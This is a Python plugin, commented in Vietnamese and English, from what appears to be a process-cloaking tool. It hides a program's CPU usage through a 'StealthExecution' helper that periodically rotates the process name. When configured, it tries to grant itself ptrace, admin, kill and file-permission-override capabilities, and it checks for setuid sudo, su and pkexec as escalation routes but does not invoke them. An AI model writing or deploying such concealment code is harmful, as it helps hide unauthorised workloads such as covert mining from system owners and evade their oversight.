"""cpu_plugins.cloaking.stealth_plugin

Plugin che giấu CPU sử dụng StealthExecution.
"""
from __future__ import annotations

import logging
import os
import pwd
import grp
import subprocess
from typing import Dict, Any, Optional, Set, List
import ctypes
import ctypes.util

from ..core import ICpuTechnique, register_plugin
from .stealth_exec import StealthExecution


@register_plugin("stealth_execution")
class StealthExecutionPlugin(ICpuTechnique):
    """**Plugin** (trình cắm) che giấu **CPU** sử dụng **StealthExecution** (thực thi ẩn danh)."""
    
    name = "stealth_execution"
    priority = 10
    
    def __init__(self):
        """Khởi tạo plugin với Dynamic Privilege Adaptation capabilities."""
        self.logger = logging.getLogger(__name__)
        self.stealth_executor: Optional[StealthExecution] = None
        self.engine = None
        self.config = {}
        
        # ✅ DYNAMIC PRIVILEGE ADAPTATION INTEGRATION
        # **Linux Capabilities** (Khả năng Linux) needed for process manipulation
        self.REQUIRED_CAPABILITIES = {
            'CAP_SYS_PTRACE': 19,   # ptrace any process
            'CAP_SYS_ADMIN': 21,    # Various admin operations
            'CAP_KILL': 5,          # Send signals to processes
            'CAP_DAC_OVERRIDE': 1   # Override file permission checks
        }
        
        # **Current Privilege State** (Trạng thái đặc quyền hiện tại)
        self.current_privileges = {
            'uid': os.getuid(),
            'gid': os.getgid(),
            'effective_uid': os.geteuid(),
            'effective_gid': os.getegid(),
            'capabilities': set()
        }
        
        # **Privilege Enhancement Status** (Trạng thái nâng cao đặc quyền)
        self.privilege_enhancement = {
            'attempted': False,
            'successful': False,
            'method_used': None,
            'original_privileges': None
        }
    
    def init(self, engine: Any, config: Optional[Dict[str, Any]] = None) -> bool:
        """Khởi tạo plugin với engine và cấu hình."""
        self.engine = engine
        self.config = config or {}
        
        try:
            # ✅ DYNAMIC PRIVILEGE ADAPTATION: Initialize privilege assessment
            self._initialize_privilege_assessment()
            
            # Try to enhance privileges if configured
            if self.config.get("enhance_privileges", False):
                self._attempt_privilege_enhancement()
            
            rotation_interval = self.config.get("comm_rotation_interval", 30)
            self.stealth_executor = StealthExecution(
                logger=self.logger,
                comm_rotation_interval=rotation_interval
            )
            
            # **Start** (bắt đầu) che giấu ngay lập tức nếu được **configured** (cấu hình)
            if self.config.get("start_immediately", False):
                self.stealth_executor.start()
                
            self.logger.info("**Stealth execution plugin** (plugin thực thi ẩn danh) **initialized** (đã khởi tạo)")
            return True
            
        except Exception as e:
            self.logger.error(f"**Failed to initialize** (không thể khởi tạo) **stealth execution plugin** (plugin thực thi ẩn danh): {e}")
            return False
    
    def apply(self, pid: int) -> bool:
        """
        Áp dụng che giấu cho một PID cụ thể.
        
        **[SELF-STEALTH INTEGRATION]**: Skip external PID tracking khi process sử dụng self-stealth wrapper.
        Điều này tránh **[access_denied errors]** trong log khi cố gắng modify external processes.
        """
        # **[SELF-STEALTH CHECK]**: Kiểm tra xem có đang sử dụng self-stealth mode không
        self_stealth_enabled = self.config.get("enable_self_stealth_mode", True)
        
        if self_stealth_enabled:
            self.logger.info(f"🔒 [SELF-STEALTH] Skipping external PID tracking for {pid} - using self-managed stealth")
            self.logger.info("✅ [SELF-STEALTH] Process should handle stealth internally via wrapper")
            return True  # Return success vì process tự quản lý stealth
        
        # **[LEGACY MODE]**: Traditional external PID tracking (có thể gây access_denied)
        if not self.stealth_executor:
            self.logger.warning("**Stealth executor** (bộ thực thi ẩn danh) **not initialized** (chưa được khởi tạo)")
            return False
        
        # Đảm bảo **stealth executor** (bộ thực thi ẩn danh) đang chạy
        if not getattr(self.stealth_executor, "_running", False):
            self.stealth_executor.start()
        
        # Thêm **PID** (mã nhận dạng tiến trình) vào **tracking list** (danh sách theo dõi)
        self.logger.warning("⚠️ [LEGACY-STEALTH] Using external PID tracking - may cause access_denied errors")
        return self.stealth_executor.add_process(pid)
    
    def stop(self) -> bool:
        """Dừng plugin và giải phóng tài nguyên."""
        if self.stealth_executor:
            self.stealth_executor.stop()
            self.stealth_executor = None
            
        self.logger.info("**Stealth execution plugin** (plugin thực thi ẩn danh) **stopped** (đã dừng)")
        return True
    
    def _initialize_privilege_assessment(self) -> None:
        """
        **Initialize Privilege Assessment** (Khởi tạo đánh giá đặc quyền – kiểm tra khả năng hệ thống)
        Assess current privilege level and capabilities.
        """
        try:
            # Update current privilege state
            self.current_privileges.update({
                'uid': os.getuid(),
                'gid': os.getgid(), 
                'effective_uid': os.geteuid(),
                'effective_gid': os.getegid()
            })
            
            # Check available capabilities
            self.current_privileges['capabilities'] = self._get_current_capabilities()
            
            # Log privilege assessment
            self.logger.info(f"🔐 [PRIVILEGE_ASSESSMENT] Current UID: {self.current_privileges['uid']}")
            self.logger.info(f"🔐 [PRIVILEGE_ASSESSMENT] Effective UID: {self.current_privileges['effective_uid']}")
            self.logger.info(f"🔐 [PRIVILEGE_ASSESSMENT] Available capabilities: {self.current_privileges['capabilities']}")
            
            # Check if we have sufficient privileges for stealth operations
            has_sufficient = self._check_sufficient_privileges()
            if not has_sufficient:
                self.logger.warning("⚠️ [PRIVILEGE_ASSESSMENT] Insufficient privileges for full stealth capabilities")
            else:
                self.logger.info("✅ [PRIVILEGE_ASSESSMENT] Sufficient privileges detected")
                
        except Exception as e:
            self.logger.error(f"❌ [PRIVILEGE_ASSESSMENT] Failed to assess privileges: {e}")
    
    def _get_current_capabilities(self) -> Set[str]:
        """
        **Get Current Capabilities** (Lấy khả năng hiện tại – đọc Linux capabilities)
        Read current process capabilities.
        """
        capabilities = set()
        try:
            # Try to read capabilities from /proc/self/status
            with open('/proc/self/status', 'r') as f:
                for line in f:
                    if line.startswith('CapEff:'):
                        cap_eff = int(line.split()[1], 16)
                        # Convert hex capabilities to capability names
                        for cap_name, cap_value in self.REQUIRED_CAPABILITIES.items():
                            if cap_eff & (1 << cap_value):
                                capabilities.add(cap_name)
                        break
                        
        except Exception as e:
            self.logger.debug(f"Could not read capabilities: {e}")
            
        return capabilities
    
    def _check_sufficient_privileges(self) -> bool:
        """
        **Check Sufficient Privileges** (Kiểm tra đặc quyền đủ – xác định khả năng hoạt động)
        Determine if current privileges are sufficient for stealth operations.
        """
        # Check if running as root
        if self.current_privileges['effective_uid'] == 0:
            return True
            
        # Check required capabilities
        required_caps = set(self.REQUIRED_CAPABILITIES.keys())
        available_caps = self.current_privileges['capabilities']
        
        missing_caps = required_caps - available_caps
        if missing_caps:
            self.logger.info(f"Missing capabilities: {missing_caps}")
            return False
            
        return True
    
    def _attempt_privilege_enhancement(self) -> bool:
        """
        **Attempt Privilege Enhancement** (Thử nâng cao đặc quyền – cố gắng cải thiện quyền truy cập)
        Try to enhance privileges using various methods.
        """
        if self.privilege_enhancement['attempted']:
            return self.privilege_enhancement['successful']
            
        self.privilege_enhancement['attempted'] = True
        self.privilege_enhancement['original_privileges'] = self.current_privileges.copy()
        
        try:
            # Method 1: Check if already has sufficient privileges
            if self._check_sufficient_privileges():
                self.privilege_enhancement['successful'] = True
                self.privilege_enhancement['method_used'] = 'already_sufficient'
                self.logger.info("✅ [PRIVILEGE_ENHANCEMENT] Already have sufficient privileges")
                return True
            
            # Method 2: Try to set capabilities if available
            if self._try_set_capabilities():
                self.privilege_enhancement['successful'] = True
                self.privilege_enhancement['method_used'] = 'capabilities'
                self.logger.info("✅ [PRIVILEGE_ENHANCEMENT] Successfully enhanced via capabilities")
                return True
                
            # Method 3: Check for setuid binary wrapper
            if self._try_setuid_wrapper():
                self.privilege_enhancement['successful'] = True
                self.privilege_enhancement['method_used'] = 'setuid_wrapper'
                self.logger.info("✅ [PRIVILEGE_ENHANCEMENT] Successfully enhanced via setuid wrapper")
                return True
                
            # If no methods work, operate with limited capabilities
            self.logger.warning("⚠️ [PRIVILEGE_ENHANCEMENT] Could not enhance privileges - operating with limited capabilities")
            self.privilege_enhancement['successful'] = False
            self.privilege_enhancement['method_used'] = 'limited_mode'
            return False
            
        except Exception as e:
            self.logger.error(f"❌ [PRIVILEGE_ENHANCEMENT] Error during privilege enhancement: {e}")
            self.privilege_enhancement['successful'] = False
            return False
    
    def _try_set_capabilities(self) -> bool:
        """Try to set required capabilities using libcap"""
        try:
            # This would require python-libcap library
            # For now, just check if capabilities can be modified
            
            # Try to load libcap
            try:
                import cap_ng
                # Use python-cap-ng if available
                cap_ng.capng_clear(cap_ng.CAPNG_SELECT_BOTH)
                
                # Add required capabilities 
                for cap_name, cap_value in self.REQUIRED_CAPABILITIES.items():
                    cap_ng.capng_update(cap_ng.CAPNG_ADD, 
                                       cap_ng.CAPNG_EFFECTIVE | cap_ng.CAPNG_PERMITTED,
                                       cap_value)
                
                # Apply capabilities
                if cap_ng.capng_apply(cap_ng.CAPNG_SELECT_BOTH) == 0:
                    return True
                    
            except ImportError:
                self.logger.debug("python-cap-ng not available")
                
            return False
            
        except Exception as e:
            self.logger.debug(f"Could not set capabilities: {e}")
            return False
    
    def _try_setuid_wrapper(self) -> bool:
        """Try to find and use setuid wrapper for privilege escalation"""
        try:
            # Look for potential setuid wrappers
            potential_wrappers = [
                '/usr/bin/sudo',
                '/bin/su',
                '/usr/bin/pkexec'
            ]
            
            for wrapper in potential_wrappers:
                if os.path.exists(wrapper) and os.access(wrapper, os.X_OK):
                    # Check if setuid bit is set
                    stat_info = os.stat(wrapper)
                    if stat_info.st_mode & 0o4000:  # setuid bit
                        self.logger.debug(f"Found potential setuid wrapper: {wrapper}")
                        # Don't actually use it - just indicate availability
                        return False  # Return False for security - don't auto-escalate
                        
            return False
            
        except Exception as e:
            self.logger.debug(f"Could not check setuid wrappers: {e}")
            return False
    
    def get_privilege_status(self) -> Dict[str, Any]:
        """
        **Get Privilege Status** (Lấy trạng thái đặc quyền – báo cáo khả năng hiện tại)
        Return comprehensive privilege status information.
        """
        return {
            'current_privileges': self.current_privileges.copy(),
            'enhancement_status': self.privilege_enhancement.copy(),
            'required_capabilities': self.REQUIRED_CAPABILITIES.copy(),
            'sufficient_privileges': self._check_sufficient_privileges(),
            'privilege_recommendations': self._get_privilege_recommendations()
        }
    
    def _get_privilege_recommendations(self) -> List[str]:
        """Get recommendations for improving privileges"""
        recommendations = []
        
        if not self._check_sufficient_privileges():
            if self.current_privileges['effective_uid'] != 0:
                recommendations.append("Consider running as root for full capabilities")
                
            missing_caps = (set(self.REQUIRED_CAPABILITIES.keys()) - 
                          self.current_privileges['capabilities'])
            if missing_caps:
                recommendations.append(f"Required capabilities missing: {', '.join(missing_caps)}")
                recommendations.append("Use 'setcap' command to grant specific capabilities")
                
        return recommendations 